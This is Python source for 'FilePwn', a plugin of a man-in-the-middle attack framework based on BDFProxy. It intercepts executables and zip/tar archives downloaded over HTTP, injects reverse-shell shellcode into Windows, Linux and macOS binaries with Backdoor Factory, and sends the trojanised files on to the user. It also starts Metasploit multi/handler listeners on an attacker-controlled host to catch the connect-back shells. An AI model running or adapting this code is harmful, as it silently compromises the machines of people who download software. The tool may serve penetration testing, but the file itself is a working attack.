#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

#--------------------------------------------------------------------------------#

# BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
#
# Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
#
# Copyright (c) 2013-2014, Joshua Pitts
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#   1. Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
#
#   2. Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
#
#   3. Neither the name of the copyright holder nor the names of its contributors
#   may be used to endorse or promote products derived from this software without
#   specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#
# Tested on Kali-Linux. (and Arch Linux)

import sys
import os
import pefile
import zipfile
import logging
import shutil
import tempfile
import random
import string
import threading
import multiprocessing
import tarfile
import magic

from libs.bdfactory import pebin
from libs.bdfactory import elfbin
from libs.bdfactory import machobin

from plugins.plugin import Plugin
from tempfile import mkstemp

class FilePwn(Plugin):
    name        = "FilePwn"
    optname     = "filepwn"
    desc        = "Backdoor executables being sent over http using bdfactory"
    tree_info   = ["BDFProxy v0.3.2 online"]
    version     = "0.3"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options

        self.patched = multiprocessing.Queue()

        from core.msfrpc import Msf
        self.msf = Msf()

        self.binaryMimeType = {'mimes': ['application/octet-stream', 'application/x-msdownload',
                               'application/x-msdos-program', 'binary/octet-stream',
                               'application/x-executable', 'application/x-dosexec']}

        self.zipType = {'mimes': ['application/x-zip-compressed', 'application/zip'], 'params': {'type': 'ZIP', 'format': 'zip', 'filter': None}}  # .zip

        self.gzType = {'mimes': ['application/gzip', 'application/x-gzip', 'application/gnutar'], 'params': {'type': 'TAR', 'format': 'ustar', 'filter': 'gzip'}}  # .gz

        self.tarType = {'mimes': ['application/x-tar'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': None}}  # .tar

        self.bzType = {'mimes': ['application/x-bzip2', 'application/x-bzip'], 'params': {'type': 'TAR', 'format': 'gnutar', 'filter': 'bzip2'}}  # .bz / .bz2

        self.archiveTypes = [self.zipType, self.gzType, self.tarType, self.bzType]

        #FilePwn options
        self.set_config()
        self.parse_target_config(self.user_config['targets']['ALL'])

        self.tree_info.append("Connected to Metasploit v{}".format(self.msf.version))

        t = threading.Thread(name='setup_msf', target=self.setup_msf)
        t.setDaemon(True)
        t.start()

    def setup_msf(self):
        for config in [self.LinuxIntelx86, self.LinuxIntelx64, self.WindowsIntelx86, self.WindowsIntelx64, self.MachoIntelx86, self.MachoIntelx64]:
            cmd = "use exploit/multi/handler\n"
            cmd += "set payload {}\n".format(config["MSFPAYLOAD"])
            cmd += "set LHOST {}\n".format(config["HOST"])
            cmd += "set LPORT {}\n".format(config["PORT"])
            cmd += "set ExitOnSession False\n"
            cmd += "exploit -j\n"

            self.msf.sendcommand(cmd)

    def on_config_change(self):
        self.initialize(self.options)

    def str2bool(self, val):
        if val.lower() == 'true':
            return True
        elif val.lower() == 'false':
            return False
        else:
            return None

    def inject(self, data):

        if len(data) > self.archive_max_size:
            self.log.error("{0} over allowed size".format(self.archive_type))
            return data

        buf = None

        if self.archive_type == "ZIP":
            buf = self.inject_zip(data)
        elif self.archive_type == "TAR":
            buf = self.inject_tar(data, self.archive_params['filter'])

        return buf

    def inject_tar(self, aTarFileBytes, formatt=None):
        # When called will unpack and edit a Tar File and return a tar file"

        tmp_file = tempfile.NamedTemporaryFile()
        tmp_file.write(aTarFileBytes)
        tmp_file.seek(0)

        compression_mode = ':'
        if formatt == 'gzip':
            compression_mode = ':gz'
        if formatt == 'bzip2':
            compression_mode = ':bz2'

        try:
            tar_file = tarfile.open(fileobj=tmp_file, mode='r' + compression_mode)
        except tarfile.ReadError as ex:
            self.log.warning(ex)
            tmp_file.close()
            return aTarFileBytes

        self.log.info("TarFile contents and info (compression: {0}):".format(formatt))

        members = tar_file.getmembers()
        for info in members:
            print "\t{0} {1}".format(info.name, info.size)

        new_tar_storage = tempfile.NamedTemporaryFile()
        new_tar_file = tarfile.open(mode='w' + compression_mode, fileobj=new_tar_storage)

        patch_count = 0
        was_patched = False

        for info in members:
            self.log.info(">>> Next file in tarfile: {0}".format(info.name))

            if not info.isfile():
                self.log.warning("{0} is not a file, skipping".format(info.name))
                new_tar_file.addfile(info, tar_file.extractfile(info))
                continue

            if info.size >= long(self.FileSizeMax):
                self.log.warning("{0} is too big, skipping".format(info.name))
                new_tar_file.addfile(info, tar_file.extractfile(info))
                continue

            # Check against keywords
            if self.check_keyword(info.name.lower()) is True:
                self.log.info('Tar blacklist enforced on {0}'.format(info.name))
                continue

            # Try to patch
            extracted_file = tar_file.extractfile(info)

            if patch_count >= self.archive_patch_count:
                self.log.info("Met archive config patchCount limit. Adding original file")
                new_tar_file.addfile(info, extracted_file)
            else:
                # create the file on disk temporarily for fileGrinder to run on it
                with tempfile.NamedTemporaryFile() as tmp:
                    shutil.copyfileobj(extracted_file, tmp)
                    tmp.flush()
                    patch_result = self.binaryGrinder(tmp.name)
                    if patch_result:
                        patch_count += 1
                        file2 = os.path.join(BDFOLDER, os.path.basename(tmp.name))
                        self.log.info("{0} in archive patched, adding to final archive".format(info.name))
                        info.size = os.stat(file2).st_size
                        with open(file2, 'rb') as f:
                            new_tar_file.addfile(info, f)
                        os.remove(file2)
                        was_patched = True
                    else:
                        self.log.info("{0} patching failed. Keeping original file.".format(info.name))
                        with open(tmp.name, 'rb') as f:
                            new_tar_file.addfile(info, f)

        # finalize the writing of the tar file first
        new_tar_file.close()

        if was_patched is False:
            # If nothing was changed return the original
            self.log.info("No files were patched. Forwarding original file")
            new_tar_storage.close()  # it's automatically deleted
            return aTarFileBytes

        # then read the new tar file into memory
        new_tar_storage.seek(0)
        buf = new_tar_storage.read()
        new_tar_storage.close()  # it's automatically deleted

        return buf

    def inject_zip(self, aZipFile):
        # When called will unpack and edit a Zip File and return a zip file
        tmp_file = tempfile.NamedTemporaryFile()
        tmp_file.write(aZipFile)
        tmp_file.seek(0)

        zippyfile = zipfile.ZipFile(tmp_file.name, 'r')

        # encryption test
        try:
            zippyfile.testzip()
        except RuntimeError as e:
            if 'encrypted' in str(e):
                self.log.warning("Encrypted zipfile found. Not patching.")
            else:
                self.log.warning("Zipfile test failed. Returning original archive")
            zippyfile.close()
            tmp_file.close()
            return aZipFile

        self.log.info("ZipFile contents and info:")

        for info in zippyfile.infolist():
            print "\t{0} {1}".format(info.filename, info.file_size)

        tmpDir = tempfile.mkdtemp()
        zippyfile.extractall(tmpDir)

        patch_count = 0
        was_patched = False

        for info in zippyfile.infolist():
            self.log.info(">>> Next file in zipfile: {0}".format(info.filename))
            actual_file = os.path.join(tmpDir, info.filename)

            if os.path.islink(actual_file) or not os.path.isfile(actual_file):
                self.log.warning("{0} is not a file, skipping".format(info.filename))
                continue

            if os.lstat(actual_file).st_size >= long(self.FileSizeMax):
                self.log.warning("{0} is too big, skipping".format(info.filename))
                continue

            # Check against keywords
            if self.check_keyword(info.filename.lower()) is True:
                self.log.info('Zip blacklist enforced on {0}'.format(info.filename))
                continue

            if patch_count >= self.archive_patch_count:
                self.log.info("Met archive config patchCount limit. Adding original file")
                break
            else:
                patch_result = self.binaryGrinder(actual_file)
                if patch_result:
                    patch_count += 1
                    file2 = os.path.join(BDFOLDER, os.path.basename(info.filename))
                    self.log.info("Patching complete, adding to archive file.")
                    shutil.copyfile(file2, actual_file)
                    self.log.info("{0} in archive patched, adding to final archive".format(info.filename))
                    os.remove(file2)
                    was_patched = True
                else:
                    self.log.error("{0} patching failed. Keeping original file.".format(info.filename))

        zippyfile.close()

        if was_patched is False:
            self.log.info("No files were patched. Forwarding original file")
            tmp_file.close()
            shutil.rmtree(tmpDir, ignore_errors=True)
            return aZipFile

        zip_result = zipfile.ZipFile(tmp_file.name, 'w', zipfile.ZIP_DEFLATED)

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                filename = os.path.join(base, afile)
                zip_result.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zip_result.close()
        # clean up
        shutil.rmtree(tmpDir, ignore_errors=True)

        with open(tmp_file.name, 'rb') as f:
            zip_data = f.read()
            tmp_file.close()

        return zip_data

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                # update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                    add_section = False
                    cave_jumping = False
                    if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx64['SHELL'],
                                             HOST=self.WindowsIntelx64['HOST'],
                                             PORT=int(self.WindowsIntelx64['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             RUNAS_ADMIN=self.str2bool(self.WindowsIntelx86['RUNAS_ADMIN']),
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx64['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx64['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower(),
                                             SUPPLIED_BINARY=self.WindowsIntelx64['SUPPLIED_BINARY'],
                                             )

                    result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                    add_section = False
                    cave_jumping = False
                    # add_section wins for cave_jumping
                    # default is single for BDF
                    if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True
                        add_section = False

                    targetFile = pebin.pebin(FILE=binaryFile,
                                             OUTPUT=os.path.basename(binaryFile),
                                             SHELL=self.WindowsIntelx86['SHELL'],
                                             HOST=self.WindowsIntelx86['HOST'],
                                             PORT=int(self.WindowsIntelx86['PORT']),
                                             ADD_SECTION=add_section,
                                             CAVE_JUMPING=cave_jumping,
                                             IMAGE_TYPE=self.WindowsType,
                                             RUNAS_ADMIN=self.str2bool(self.WindowsIntelx86['RUNAS_ADMIN']),
                                             PATCH_DLL=self.str2bool(self.WindowsIntelx86['PATCH_DLL']),
                                             SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
                                             ZERO_CERT=self.str2bool(self.WindowsIntelx86['ZERO_CERT']),
                                             PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower(),
                                             SUPPLIED_BINARY=self.WindowsIntelx86['SUPPLIED_BINARY'],
                                             XP_MODE=self.str2bool(self.WindowsIntelx86['XP_MODE'])
                                             )

                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    # x86CPU Type
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    # x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                # ONE CHIP SET MUST HAVE PRIORITY in FAT FILE

                if targetFile.FAT_FILE is True:
                    if self.FatPriority == 'x86':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx86['SHELL'],
                                                       HOST=self.MachoIntelx86['HOST'],
                                                       PORT=int(self.MachoIntelx86['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                    elif self.FatPriority == 'x64':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx64['SHELL'],
                                                       HOST=self.MachoIntelx64['HOST'],
                                                       PORT=int(self.MachoIntelx64['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            self.log.error("Exception in binaryGrinder {0}".format(e))
            return None

    def set_config(self):
        try:
            self.user_config = self.config['FilePwn']
            self.host_blacklist = self.user_config['hosts']['blacklist']
            self.host_whitelist = self.user_config['hosts']['whitelist']
            self.keys_blacklist = self.user_config['keywords']['blacklist']
            self.keys_whitelist = self.user_config['keywords']['whitelist']
        except Exception as e:
            self.log.error("Missing field from config file: {0}".format(e))

    def set_config_archive(self, ar):
        try:
            self.archive_type = ar['type']
            self.archive_blacklist = self.user_config[self.archive_type]['blacklist']
            self.archive_max_size = int(self.user_config[self.archive_type]['maxSize'])
            self.archive_patch_count = int(self.user_config[self.archive_type]['patchCount'])
            self.archive_params = ar
        except Exception as e:
            raise Exception("Missing {0} section from config file".format(e))

    def hosts_whitelist_check(self, req_host):
        if self.host_whitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.host_whitelist) is str:
            if self.host_whitelist.lower() in req_host.lower():
                self.patchIT = True
                self.log.info("Host whitelist hit: {0}, HOST: {1}".format(self.host_whitelist, req_host))
        elif req_host.lower() in self.host_whitelist.lower():
            self.patchIT = True
            self.log.info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, req_host))
        else:
            for keyword in self.host_whitelist:
                if keyword.lower() in req_host.lower():
                    self.patchIT = True
                    self.log.info("Host whitelist hit: {0}, HOST: {1} ".format(self.host_whitelist, req_host))
                    break

    def keys_whitelist_check(self, req_url, req_host):
        # Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if self.keys_whitelist.lower() == 'all':
            self.patchIT = True
        elif type(self.keys_whitelist) is str:
            if self.keys_whitelist.lower() in req_url.lower():
                self.patchIT = True
                self.log.info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, req_url))
        elif req_host.lower() in [x.lower() for x in self.keys_whitelist]:
            self.patchIT = True
            self.log.info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, req_url))
        else:
            for keyword in self.keys_whitelist:
                if keyword.lower() in req_url.lower():
                    self.patchIT = True
                    self.log.info("Keyword whitelist hit: {0}, PATH: {1}".format(self.keys_whitelist, req_url))
                    break

    def keys_backlist_check(self, req_url, req_host):
        if type(self.keys_blacklist) is str:
            if self.keys_blacklist.lower() in req_url.lower():
                self.patchIT = False
                self.log.info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, req_url))
        else:
            for keyword in self.keys_blacklist:
                if keyword.lower() in req_url.lower():
                    self.patchIT = False
                    self.log.info("Keyword blacklist hit: {0}, PATH: {1}".format(self.keys_blacklist, req_url))
                    break

    def hosts_blacklist_check(self, req_host):
        if type(self.host_blacklist) is str:
            if self.host_blacklist.lower() in req_host.lower():
                self.patchIT = False
                self.log.info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, req_host))
        elif req_host.lower() in [x.lower() for x in self.host_blacklist]:
            self.patchIT = False
            self.log.info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, req_host))
        else:
            for host in self.host_blacklist:
                if host.lower() in req_host.lower():
                    self.patchIT = False
                    self.log.info("Host Blacklist hit: {0} : HOST: {1} ".format(self.host_blacklist, req_host))
                    break

    def parse_target_config(self, targetConfig):
        for key, value in targetConfig.items():
            if hasattr(self, key) is False:
                setattr(self, key, value)
                self.log.debug("Settings Config {0}: {1}".format(key, value))

            elif getattr(self, key, value) != value:
                if value == "None":
                    continue

                # test if string can be easily converted to dict
                if ':' in str(value):
                    for tmpkey, tmpvalue in dict(value).items():
                        getattr(self, key, value)[tmpkey] = tmpvalue
                        self.log.debug("Updating Config {0}: {1}".format(tmpkey, tmpvalue))
                else:
                    setattr(self, key, value)
                    self.log.debug("Updating Config {0}: {1}".format(key, value))

    def response(self, response, request, data):

        content_header = response.responseHeaders.getRawHeaders('Content-Type')[0]
        client_ip      = request.client.getClientIP()
        host           = request.headers['host']

        if not response.responseHeaders.hasHeader('content-length'):
             content_length = None
        else:
            content_length = int(response.responseHeaders.getRawHeaders('content-length')[0])

        for target in self.user_config['targets'].keys():
            if target == 'ALL':
                self.parse_target_config(self.user_config['targets']['ALL'])

            if target in request.headers['host']: 
                self.parse_target_config(self.user_config['targets'][target])

        self.hosts_whitelist_check(host)
        self.keys_whitelist_check(request.uri, host)
        self.keys_backlist_check(request.uri, host)
        self.hosts_blacklist_check(host)

        if content_length and (content_length >= long(self.FileSizeMax)):
                self.clientlog.info("Not patching over content-length, forwarding to user", extra=request.clientInfo)
                self.patchIT = False

        if self.patchIT is False:
            self.clientlog.info("Config did not allow patching", extra=request.clientInfo)

        else:

            mime_type = magic.from_buffer(data, mime=True)

            if mime_type in self.binaryMimeType['mimes']:
                tmp = tempfile.NamedTemporaryFile()
                tmp.write(data)
                tmp.flush()
                tmp.seek(0)

                patchResult = self.binaryGrinder(tmp.name)
                if patchResult:
                    self.clientlog.info("Patching complete, forwarding to user", extra=request.clientInfo)

                    bd_file = os.path.join('backdoored', os.path.basename(tmp.name))
                    with open(bd_file, 'r+b') as file2:
                        data = file2.read()
                        file2.close()

                    os.remove(bd_file)
                else:
                    self.clientlog.error("Patching failed", extra=request.clientInfo)

                # add_try to delete here
                tmp.close()
            else:
                for archive in self.archiveTypes:
                    if mime_type in archive['mimes'] and self.str2bool(self.CompressedFiles) is True:
                        try:
                            self.set_config_archive(archive['params'])
                            data = self.inject(data)
                        except Exception as exc:
                            self.clientlog.error(exc, extra=request.clientInfo)
                            self.clientlog.warning("Returning original file", extra=request.clientInfo)

        return {'response': response, 'request': request, 'data': data}